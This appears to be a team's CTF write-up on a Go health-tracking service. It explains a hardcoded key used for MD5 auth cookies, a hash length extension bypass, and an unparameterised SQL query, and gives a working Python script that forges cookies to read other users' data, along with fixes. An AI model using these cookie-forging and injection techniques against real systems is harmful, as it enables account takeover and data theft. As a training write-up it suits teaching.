# Healthmonitor (hm)

First glance at Healthmonitor, called "hm", revealed a simple register/login procedure, hinting at a database. 
Written in go(golang), with access to source code.
After logging in, we could add health metrics (weight, blood pressure, pulse, walking distance and a comment) and list these.
Comments were only visible to the respective users when logged in.
The database showed several users having flags as comments.
Our goal was to read comments from other users from within one active.
While registered and logged in we got some cookies: session, auth (which was obviously a md5 hash) and an id (which was a base64 decoded string "u_XXX", the user_id)

## fixed key

Our go-to (obvious pun intended) was to look at main.go which showed a constant key. And since every team had the same vbox image, every team had to have the same key. This constant key was used for the auth cookie generation:

e.g. the auth-verifier
~~~
func authVerified(auth string, uId string) (bool, error) {
	id := decodeBase64(uId)	//decode uID from cookie -> u_XXX
    res := md5hash(Key, id) //calculate md5hash of the key and the uID
	if res == auth {		//if its equal with the auth value from the cookie return true else false
		return true, nil
	} else {
		return false, errors.New(Unauthorized)
	}
}
~~~

We could see that you only had to know the uID and the key to calculate the auth-cookie. Since every key on every image was the same, we could easily exploit it.
Course of action, accordingly, was:

1. Register a user to get the highest uID
2. Change the uID, calculate the md5hash for the new auth-cookie and send a request to read your health metrics

The best solution was to decrease the uID and submit flags until no valid flags were left.

Quick & Dirty exploit
(python)
~~~
import requests, re, base64, hashlib, random, string, sys

key = "f11ecd5521ddf2614e17e4fb074a86da"

#register new user
randomuser = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(16)])
url = "http://" + str(sys.argv[1]) + ":8000"
body = {'Login': randomuser, 'Pass':randomuser}
r = requests.post(url + "/newuser", data=body)
uid = int(re.findall(r'assigned: u_([0-9]+)', r.text)[0])
uidorig = uid
bufferr = "";

while(uid > uidorig - 100): #here you could improve the exploit
	uid = uid - 1
	#calc auth
	md5sum = hashlib.md5(key + 'u_' + str(uid)).hexdigest()
	#uID 
	uidBase64 = base64.b64encode('u_' + str(uid))
	cookies = dict(auth=md5sum, id=uidBase64)
	#get metrics
	r = requests.get(url + "/healthmetrics", cookies=cookies)
	print r.text #our submitter greps the flags
~~~

To fix the flaw we just changed the key and recompiled it. (# go build)

## hash length extension

This was the most obvious flaw and we did not look or think further. But there was more and other teams were probably just as lazy as we were and just changed the key and were still vulnerable to a hash length extension attack. Since auth was calculated via `md5(key, id)`, and the id was user provided we could provide arbitrary data. 

If you're doing a lot of CTFs you are probably familiar with hash extension if not the best thing to start is by reading [this blog post](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) and playing around with [hash_extender](https://github.com/iagox86/hash_extender) 

If you are lazy and don't want to read up here is the short version: Merkel-Damgard Hashes like MD5 and SHA1/SHA2 are vulnerable to hash length extension attacks. This attacks allows you to recalculate hashes that are built like the one above `hash(secret, user-provided-data)`. You could than just append more data and calculate a corresponding hash without knowledge of the secret. 

To make this work there still had to be some features in the code. To exploit the flaw you'd need to change the base64 encoded user id and the auth token. You could only append data to the user id, not change it, but these features were provided. 
The check for the auth cookie is done in getUserId:

~~~
auth := authCookie.Value
id := idCookie.Value
verified, err := authVerified(auth, id)
~~~
and after that verification the id is extracted from the id cookie with the extractUid function. 
~~~
func extractUid(idStr string) string {
	id := decodeBase64(idStr)
	f := strings.FieldsFunc(id, split)
	return f[len(f)-1]
}
~~~
interesting so what does split split?
~~~
func split(c rune) bool {
	return c == ';' || c == ' ' 
}
~~~
so we can just append the new user id after a ; and can trigger a valid authentication for that user. 

The only remaining problem is we do not know the length of the secret which we need to calculate our new auth token, but hash extender can generate multiple tokens at once with varying secret length.

So here is a pseudo code writeup after a POC with burp as we were too lazy to actually automate it with python... 

1. Create new user
2. bruteforce secret length for id - 1
3. check the next users for flags with the now known secret length

To fix this properly you should apply a HMAC instead of `md5(secret+data)` but in this context `md5(secret+data+secret)` would have been enough. 


## SQL injection
But still, there was more. Most database queries used prepared statements except the one that checked if a user name already existed. 

To fix this flaw simply change the query to a prepared statement just like the rest.

## Summary

We didn't expect that may flaws in just one service and only exploited and fixed one. But still this service was our cash cow and we were able to score good points, but the next time we will take a second look and fix and exploit more vulnerabilities. 
